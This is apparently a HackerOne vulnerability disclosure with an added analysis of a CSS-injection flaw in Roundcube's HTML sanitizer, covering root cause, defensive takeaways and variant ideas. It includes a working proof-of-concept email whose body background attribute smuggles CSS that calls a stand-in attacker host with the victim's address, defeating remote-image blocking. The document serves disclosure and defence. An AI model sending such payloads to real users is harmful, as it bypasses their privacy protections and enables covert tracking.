# CSS Injection via Unquoted body background attribute bypasses remote image blocking in Roundcube

## Metadata
- **Source:** HackerOne
- **Report:** 3590583 | https://hackerone.com/reports/3590583
- **Submitted:** 2026-03-07
- **Reporter:** nullcathedral
- **Program:** Roundcube
- **Bounty:** Not specified
- **Severity:** medium
- **Vuln:** CSS Injection, Security Bypass, Improper Input Validation
- **CVEs:** None
- **Category:** memory-binary

## Summary
Roundcube's HTML sanitizer fails to properly quote the body background attribute when converting it to inline CSS, allowing attackers to inject arbitrary CSS properties through crafted data: URIs containing closing parentheses. This injection bypasses the `allow_remote=false` setting, enabling remote resource loading and email open tracking.

## Attack scenario
1. Attacker crafts a malicious HTML email with a body element containing a background attribute set to a data: URI that includes a closing parenthesis followed by CSS injection payload
2. Email is sent to victim with Roundcube as their mail client configured with 'Block remote images' enabled (allow_remote=false)
3. Victim opens the email in Roundcube, triggering the HTML sanitizer which calls washtml_callback() to process the body element
4. The background attribute value passes through wash_uri() validation which permits data: URIs, but is then inserted unquoted into url() function in inline style
5. The closing parenthesis in the data: URI terminates the url() function prematurely, allowing injection of arbitrary CSS properties like background:url(//attacker.com)
6. Browser renders the inline style and loads the external resource from attacker server, bypassing the remote image blocking and enabling email open tracking with victim identifiers

## Root cause
The washtml_callback() function in index.php constructs inline CSS by inserting the sanitized background attribute value directly into `background-image: url(VALUE)` without properly quoting the VALUE. The parenthesis character is not escaped or validated as a CSS context delimiter, allowing it to break out of the url() function context and inject additional CSS properties that bypass the mod_css_styles() URL callback mechanism.

## Attacker mindset
An attacker seeks to track email opens and identify active users while evading Roundcube's remote image blocking protection. By exploiting the parser differential between URI validation (which allows data: URIs) and CSS parsing (which requires proper quoting), the attacker can inject CSS that loads external resources undetected, even when explicit protections are enabled.

## Defensive takeaways
- Always quote URL values in CSS url() functions using single or double quotes to prevent context breaking via special characters
- Apply context-aware output encoding: CSS properties require different escaping than URI values
- Validate not just the URI scheme and domain, but also ensure the value is safe when inserted into specific CSS function contexts
- Test security controls with payloads containing metacharacters (parentheses, semicolons, quotes) that could break context boundaries
- Apply CSS property filtering consistently whether rules are inline or in style blocks; do not assume inline styles bypass other security controls
- Use a CSS parser or builder library rather than string concatenation to construct CSS with untrusted values

## Variant hunting
Other HTML elements with event handlers or styling attributes (style, onclick, onload) converted to inline styles without proper quoting
Attribute values inserted into other CSS functions (calc(), attr(), etc.) without quoting or escaping
SVG elements with presentation attributes converted to inline styles (e.g., fill, stroke, filter attributes)
Injection via other URI-accepting attributes (srcset, poster, etc.) that may bypass wash_uri() validation in different contexts
Payloads using CSS-level escaping (backslash sequences) to bypass character filters but preserve functionality

## MITRE ATT&CK
- T1566.002
- T1190
- T1005
- T1041

## Notes
The vulnerability is a classic case of context confusion: the value is validated as a safe URI but then inserted into a CSS context without proper escaping. The attacker leverages the fact that data: URIs (which pass validation) can contain the ) character, which has special meaning in CSS url() syntax. This demonstrates why output encoding must be context-specific and why string concatenation for generating structured formats (CSS, HTML, SQL) is inherently risky.

## Full report
<details><summary>Expand</summary>

When `allow_remote` is set to `false`, Roundcube's HTML sanitizer [rcube_washtml](https://github.com/roundcube/roundcubemail/blob/4e95ebe12/program/lib/Roundcube/rcube_washtml.php) blocks external resources in image-loading attributes by checking their values through `wash_uri()`.

The body callback in [index.php washtml_callback()](https://github.com/roundcube/roundcubemail/blob/4e95ebe12/program/actions/mail/index.php) processes the `background` attribute from the email's `<body>` element and constructs an inline CSS `background-image: url(VALUE)` on the output container `<div>`. The `VALUE` is inserted into the `url()` function **without quoting**. Although `VALUE` passes through `wash_uri()` first (which allows `data:image/*` URIs), a crafted `data:` URI containing `)` terminates the `url()` function early, allowing injection of arbitrary CSS properties into the container's inline style.

Because the injected CSS is inline style on the container `<div>` (not inside a `<style>` block), it completely bypasses the `mod_css_styles()` URL callback — meaning injected `background:url(//evil.com)` or `border-image:url(//evil.com)` loads external resources even when `allow_remote=false`.

## Steps To Reproduce

### Step 1: Remote resource loading bypass

Send an HTML email with the following body:

```html
<!DOCTYPE html>
<html>
<head><title>Quarterly Report</title></head>
<body background="data:image/png,x);background:url(//ATTACKER_SERVER/track?uid=victim@test.com">
<h1>Q4 Financial Summary</h1>
<p>Dear team,</p>
<p>Please find attached the quarterly financial report.</p>
<p>Best regards,<br>Finance Department</p>
</body>
</html>
```

Step 2: Open the email in Roundcube with "Block remote images" enabled.

Step 3: Observe HTTP request to `ATTACKER_SERVER/track?uid=victim@test.com` in attacker's server logs.

### Step 4: Inspect the rendered HTML

The sanitizer produces this inline style on the body container `<div>`:

```css
background-image: url(data:image/png,x);background:url(//ATTACKER_SERVER/track?uid=victim@test.com)
```

The `)` in `data:image/png,x)` closes the original `url()`, and everything after is parsed as additional CSS properties.

## Impact

email open tracking

</details>

---
*Analysed by Claude on 2026-05-12*
